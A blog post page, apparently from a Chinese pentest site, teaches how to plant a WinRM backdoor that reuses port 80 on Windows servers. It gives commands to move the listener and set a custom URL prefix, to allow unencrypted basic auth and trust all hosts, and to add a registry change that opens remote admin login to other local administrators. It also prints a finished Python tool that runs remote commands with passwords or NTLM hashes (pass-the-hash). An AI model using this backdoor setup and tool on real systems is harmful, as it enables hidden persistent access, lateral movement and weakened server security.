@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>winRM端口复用</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Study The World </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/winrm-backdoor.html" rel="bookmark"
+           title="Permalink to winRM端口复用">winRM端口复用</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2019-10-23T00:00:00+02:00">
+                <a href='#'>10/23/2019 </a>
+                <a href="/category/pentest.html">Pentest</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <h3>原理</h3>
+<p>基本原理是利用windows的远程管理服务WinRM,在Windows 2003 Server加入了内核级驱动程序(http.sys),用于监听http流量并根据URL进行处理，允许任意用户进程共享用于HTTP流量的TCP端口。通过http.sys,多个进程可以同时监听同一端口的HTTP流量</p>
+<p>系统默认有10个DACl，可以通过<code>netsh http show urlacl</code>看到具体内容，其中5985是http端口，5986是https，在我的Windows Server 2012上面默认没有开启，只开启了一个5985端口。</p>
+<h3>条件</h3>
+<p>Windows 2008默认不开启该服务，windows 2012以及以上默认开启该服务。</p>
+<h3>开启服务</h3>
+<p>本地机器需要连接远程WinRM服务的时候，本地也需要开启WinRM服务，然后设置信任连接的主机，执行命令:</p>
+<div class="highlight"><pre><span></span><span class="n">winrm</span> <span class="n">quickconfig</span> <span class="o">-</span><span class="n">q</span>
+<span class="n">winrm</span> <span class="k">set</span> <span class="n">winrm</span><span class="o">/</span><span class="n">config</span><span class="o">/</span><span class="n">Client</span> <span class="o">@</span><span class="err">{</span><span class="n">TrustedHosts</span><span class="o">=</span><span class="ss">&quot;*&quot;</span><span class="err">}</span>
+</pre></div>
+
+
+<p>连接(默认端口是5985，需要加上去):</p>
+<div class="highlight"><pre><span></span><span class="n">winrs</span> <span class="o">-</span><span class="n">r</span><span class="p">:</span><span class="n">http</span><span class="p">:</span><span class="o">//&lt;</span><span class="n">ip</span><span class="o">&gt;</span><span class="p">:</span><span class="o">&lt;</span><span class="n">port</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">u</span><span class="p">:</span><span class="o">&lt;</span><span class="k">user</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">p</span><span class="p">:</span><span class="o">&lt;</span><span class="n">pass</span><span class="o">&gt;</span> <span class="o">&lt;</span><span class="n">command</span><span class="o">&gt;</span> 
+</pre></div>
+
+
+<h3>设置后门:</h3>
+<div class="highlight"><pre><span></span><span class="err">修改默认端口为</span><span class="mi">80</span><span class="o">:</span> <span class="n">winrm</span> <span class="kd">set</span> <span class="n">winrm</span><span class="sr">/config/</span><span class="n">Listener</span><span class="o">?</span><span class="n">Address</span><span class="o">=*+</span><span class="n">Transport</span><span class="o">=</span><span class="n">HTTP</span> <span class="err">@</span><span class="o">{</span><span class="n">Port</span><span class="o">=</span><span class="s2">&quot;80&quot;</span><span class="o">}</span>
+<span class="err">还原为</span><span class="mi">5985</span><span class="o">:</span> <span class="n">winrm</span> <span class="kd">set</span> <span class="n">winrm</span><span class="sr">/config/</span><span class="n">Listener</span><span class="o">?</span><span class="n">Address</span><span class="o">=*+</span><span class="n">Transport</span><span class="o">=</span><span class="n">HTTP</span> <span class="err">@</span><span class="o">{</span><span class="n">Port</span><span class="o">=</span><span class="s2">&quot;5985&quot;</span><span class="o">}</span>
+<span class="err">设置</span><span class="n">URI</span><span class="o">:</span> <span class="n">winrm</span> <span class="kd">set</span> <span class="n">winrm</span><span class="sr">/config/</span><span class="n">Listener</span><span class="o">?</span><span class="n">Address</span><span class="o">=*+</span><span class="n">Transport</span><span class="o">=</span><span class="n">HTTP</span> <span class="err">@</span><span class="o">{</span><span class="n">URLPrefix</span><span class="o">=</span><span class="s2">&quot;lalala&quot;</span><span class="o">}</span>
+</pre></div>
+
+
+<h3>常用命令</h3>
+<div class="highlight"><pre><span></span>查看注册的<span class="nv">URL</span>: <span class="nv">netsh</span> <span class="nv">http</span> <span class="k">show</span> <span class="nv">servicestate</span>
+查看监听配置: <span class="nv">winrm</span> <span class="nv">e</span> <span class="nv">winrm</span><span class="o">/</span><span class="nv">config</span><span class="o">/</span><span class="nv">listener</span>
+查看配置: <span class="nv">winrm</span> <span class="nv">get</span> <span class="nv">winrm</span><span class="o">/</span><span class="nv">config</span>
+新增<span class="mi">80</span>端口监听: <span class="nv">winrm</span> <span class="nv">set</span> <span class="nv">winrm</span><span class="o">/</span><span class="nv">config</span><span class="o">/</span><span class="nv">service</span> @{<span class="nv">EnableCompatibilityHttpListener</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">true</span><span class="s2">&quot;</span>}
+删除<span class="mi">80</span>端口监听: <span class="nv">winrm</span> <span class="nv">set</span> <span class="nv">winrm</span><span class="o">/</span><span class="nv">config</span><span class="o">/</span><span class="nv">service</span> @{<span class="nv">EnableCompatibilityHttpListener</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">false</span><span class="s2">&quot;</span>}
+</pre></div>
+
+
+<h3>设置明文连接</h3>
+<p>使用pywinrm的时候，如果是直接使用账户密码，在transport可以不用设置，但是需要在服务端设置winrm使用不加密连接:</p>
+<div class="highlight"><pre><span></span><span class="n">winrm</span> <span class="k">set</span> <span class="n">winrm</span><span class="o">/</span><span class="n">config</span><span class="o">/</span><span class="n">service</span><span class="o">/</span><span class="n">auth</span> <span class="s1">&#39;@{Basic=&quot;true&quot;}&#39;</span>
+<span class="n">winrm</span> <span class="k">set</span> <span class="n">winrm</span><span class="o">/</span><span class="n">config</span><span class="o">/</span><span class="n">service</span> <span class="s1">&#39;@{AllowUnencrypted=&quot;true&quot;}&#39;</span>
+
+<span class="n">s</span> <span class="o">=</span>  <span class="n">winrm</span><span class="p">.</span><span class="k">Session</span><span class="p">(</span><span class="ss">&quot;http://192.168.1.26:5985&quot;</span><span class="p">,</span><span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="ss">&quot;administrator&quot;</span><span class="p">,</span><span class="ss">&quot;123456&quot;</span><span class="p">))</span>
+</pre></div>
+
+
+<p>当设置basic可以认证的时候，请求5985可以看到有两种认证方式: <code>Negotiate</code>和<code>basic</code>, <code>basic</code>和普通的head头认证一样，需要base64编码</p>
+<h3>winrs.py</h3>
+<p>实现一个winrs的客户端，执行cmd命令。因为在pywirnm的源代码里面的powershell是这样的，他调用的还是run_cmd函数，而且是直接<code>powershell -encodedcommand</code>,这很不清。所以只需要完成执行cmd命令，自己写powershell调用就好了。</p>
+<div class="highlight"><pre><span></span><span class="nv">def</span> <span class="nv">run_ps</span><span class="ss">(</span><span class="nv">self</span>, <span class="nv">script</span><span class="ss">)</span>:
+        <span class="s2">&quot;&quot;&quot;</span><span class="s">base64 encodes a Powershell script and executes the powershell</span>
+        <span class="nv">encoded</span> <span class="nv">script</span> <span class="nv">command</span>
+        <span class="s2">&quot;&quot;&quot;</span>
+        # <span class="nv">must</span> <span class="nv">use</span> <span class="nv">utf16</span> <span class="nv">little</span> <span class="nv">endian</span> <span class="nv">on</span> <span class="nv">windows</span>
+        <span class="nv">encoded_ps</span> <span class="o">=</span> <span class="nv">b64encode</span><span class="ss">(</span><span class="nv">script</span>.<span class="nv">encode</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">utf_16_le</span><span class="s1">&#39;</span><span class="ss">))</span>.<span class="nv">decode</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">ascii</span><span class="s1">&#39;</span><span class="ss">)</span>
+        <span class="nv">rs</span> <span class="o">=</span> <span class="nv">self</span>.<span class="nv">run_cmd</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">powershell -encodedcommand {0}</span><span class="s1">&#39;</span>.<span class="nv">format</span><span class="ss">(</span><span class="nv">encoded_ps</span><span class="ss">))</span>
+        <span class="k">if</span> <span class="nv">len</span><span class="ss">(</span><span class="nv">rs</span>.<span class="nv">std_err</span><span class="ss">)</span>:
+            # <span class="k">if</span> <span class="nv">there</span> <span class="nv">was</span> <span class="nv">an</span> <span class="nv">error</span> <span class="nv">message</span>, <span class="nv">clean</span> <span class="nv">it</span> <span class="nv">it</span> <span class="nv">up</span> <span class="nv">and</span> <span class="nv">make</span> <span class="nv">it</span> <span class="nv">human</span>
+            # <span class="nv">readable</span>
+            <span class="nv">rs</span>.<span class="nv">std_err</span> <span class="o">=</span> <span class="nv">self</span>.<span class="nv">_clean_error_msg</span><span class="ss">(</span><span class="nv">rs</span>.<span class="nv">std_err</span><span class="ss">)</span>
+        <span class="k">return</span> <span class="nv">rs</span>
+</pre></div>
+
+
+<h3>成品</h3>
+<div class="highlight"><pre><span></span><span class="c1"># 代码参考: https://lianzhang.org/index.php/archives/8/</span>
+<span class="c1">#!/usr/bin/env python</span>
+<span class="c1"># encoding: utf-8</span>
+<span class="kn">import</span> <span class="nn">argparse</span>
+<span class="kn">import</span> <span class="nn">urlparse</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">winrm</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+
+<span class="k">def</span> <span class="nf">GetUrlState</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">405</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">True</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">False</span>
+
+
+<span class="k">def</span> <span class="nf">ParseUrl</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">parse</span> <span class="o">=</span> <span class="n">urlparse</span><span class="o">.</span><span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="n">uri</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">path</span>
+    <span class="n">ip</span> <span class="o">=</span> <span class="n">parse</span><span class="o">.</span><span class="n">netloc</span>
+    <span class="n">port</span> <span class="o">=</span> <span class="mi">80</span> <span class="k">if</span> <span class="n">parse</span><span class="o">.</span><span class="n">port</span> <span class="ow">is</span> <span class="bp">None</span> <span class="k">else</span> <span class="n">parse</span><span class="o">.</span><span class="n">port</span>
+    <span class="k">return</span> <span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">uri</span>
+
+
+<span class="k">def</span> <span class="nf">RunCmd</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">uri</span><span class="p">,</span><span class="n">cmd</span><span class="p">,</span><span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;hashpasswd&quot;</span><span class="p">):</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">Windwoscmd</span> <span class="o">=</span> <span class="n">winrm</span><span class="o">.</span><span class="n">Session</span><span class="p">(</span><span class="s1">&#39;http://&#39;</span> <span class="o">+</span> <span class="n">ip</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">+</span> <span class="n">uri</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;user&quot;</span><span class="p">),</span> <span class="s1">&#39;00000000000000000000000000000000:&#39;</span><span class="o">+</span><span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;hashpasswd&quot;</span><span class="p">)),</span>
+                                   <span class="n">transport</span><span class="o">=</span><span class="s2">&quot;ntlm&quot;</span><span class="p">,</span> <span class="n">server_cert_validation</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
+            <span class="n">Result</span> <span class="o">=</span> <span class="n">Windwoscmd</span><span class="o">.</span><span class="n">run_cmd</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">Result</span><span class="o">.</span><span class="n">std_err</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;gbk&#39;</span><span class="p">))</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">Result</span><span class="o">.</span><span class="n">std_out</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;gbk&#39;</span><span class="p">))</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
+            <span class="k">print</span> <span class="s2">&quot;[+]&gt; Hash发生错误:&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">Windwoscmd</span> <span class="o">=</span> <span class="n">winrm</span><span class="o">.</span><span class="n">Session</span><span class="p">(</span><span class="s1">&#39;http://&#39;</span> <span class="o">+</span> <span class="n">ip</span> <span class="o">+</span> <span class="s2">&quot;:&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">+</span> <span class="n">uri</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="p">(</span><span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;user&quot;</span><span class="p">),</span> <span class="n">kwargs</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;passwd&quot;</span><span class="p">)),</span>
+                                       <span class="n">transport</span><span class="o">=</span><span class="s2">&quot;basic&quot;</span><span class="p">,</span> <span class="n">server_cert_validation</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">)</span>
+            <span class="n">Result</span> <span class="o">=</span> <span class="n">Windwoscmd</span><span class="o">.</span><span class="n">run_cmd</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">Result</span><span class="o">.</span><span class="n">std_err</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;gbk&#39;</span><span class="p">))</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">Result</span><span class="o">.</span><span class="n">std_out</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;gbk&#39;</span><span class="p">))</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">ex</span><span class="p">:</span>
+            <span class="k">print</span> <span class="s2">&quot;[+]&gt; Pass发生错误:&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">ex</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="c1">#windows 2008上面是LM-HASH:NTLM-HASH的方式，需要修改源代码，去掉上面的一堆0加上冒号</span>
+    <span class="c1">#windows 2012以及之后只能抓到NTLM的Hash，直接使用即可</span>
+    <span class="n">example_text</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;example:</span>
+<span class="s1">    python winrs.py -r http://192.168.1.26:5985/wsman -u administrator -H 32ed87bdb5fdc5e9cba88547376818d4 -c &quot;whoami&quot;</span>
+<span class="s1">    &#39;&#39;&#39;</span>
+    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;WinRMTTools, only work &gt;= Windows Server 2012&#39;</span><span class="p">,</span><span class="n">epilog</span><span class="o">=</span><span class="n">example_text</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-r&quot;</span><span class="p">,</span> <span class="s2">&quot;--remote&quot;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;http://192.168.1.26:5985/wsman&quot;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-u&quot;</span><span class="p">,</span> <span class="s2">&quot;--user&quot;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&quot;administrator&quot;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-p&quot;</span><span class="p">,</span> <span class="s2">&quot;--passwd&quot;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;password&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-H&quot;</span><span class="p">,</span> <span class="s2">&quot;--hashpasswd&quot;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;NTLM-Hash&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span>
+    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s2">&quot;-c&quot;</span><span class="p">,</span> <span class="s2">&quot;--command&quot;</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s2">&quot;cmd&quot;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s2">&quot;whoami&quot;</span><span class="p">)</span>
+    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>
+    <span class="k">if</span> <span class="n">GetUrlState</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">remote</span><span class="p">):</span>
+        <span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">uri</span> <span class="o">=</span> <span class="n">ParseUrl</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">remote</span><span class="p">)</span>
+        <span class="n">RunCmd</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">uri</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">command</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">user</span><span class="p">,</span> <span class="n">passwd</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">passwd</span><span class="p">,</span> <span class="n">hashpasswd</span><span class="o">=</span><span class="n">args</span><span class="o">.</span><span class="n">hashpasswd</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s2">&quot;[*]&gt; Windwos WinRM服务未开启请检查服务是否开启！&quot;</span>
+</pre></div>
+
+
+<h3>注意事项</h3>
+<ol>
+<li>WinRM服务受UAC影响，本地管理员用户组只有administrator可以登录，其他管理员用户无法远程登录WinRM，如果要允许其他管理员用户远程登录WinRM，需要修改注册表:</li>
+</ol>
+<div class="highlight"><pre><span></span><span class="n">reg</span> <span class="k">add</span> <span class="n">HKLM</span><span class="err">\</span><span class="n">SOFTWARE</span><span class="err">\</span><span class="n">Microsoft</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">CurrentVersion</span><span class="err">\</span><span class="n">Policies</span><span class="err">\</span><span class="k">System</span> <span class="o">/</span><span class="n">v</span> <span class="n">LocalAccountTokenFilterPolicy</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="o">/</span><span class="n">d</span> <span class="mi">1</span> <span class="o">/</span><span class="n">f</span>
+</pre></div>
+
+
+<ol>
+<li>
+<p>修改URLPrefix之后，因为pywinrm默认搜索wsman，所以如果修改URLPrefix之后程序需要重写。</p>
+</li>
+<li>
+<p><a href="https://www.cnblogs.com/0x4D75/p/11381449.html">https://www.cnblogs.com/0x4D75/p/11381449.html</a></p>
+</li>
+<li><a href="https://lianzhang.org/index.php/archives/8/">https://lianzhang.org/index.php/archives/8/</a></li>
+<li><a href="https://paper.seebug.org/1004/">https://paper.seebug.org/1004/</a></li>
+<li><a href="https://threathunter.org/topic/5940a6e59c58e020408a79ea">https://threathunter.org/topic/5940a6e59c58e020408a79ea</a></li>
+<li><a href="https://www.4hou.com/technology/19806.html">https://www.4hou.com/technology/19806.html</a></li>
+</ol>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
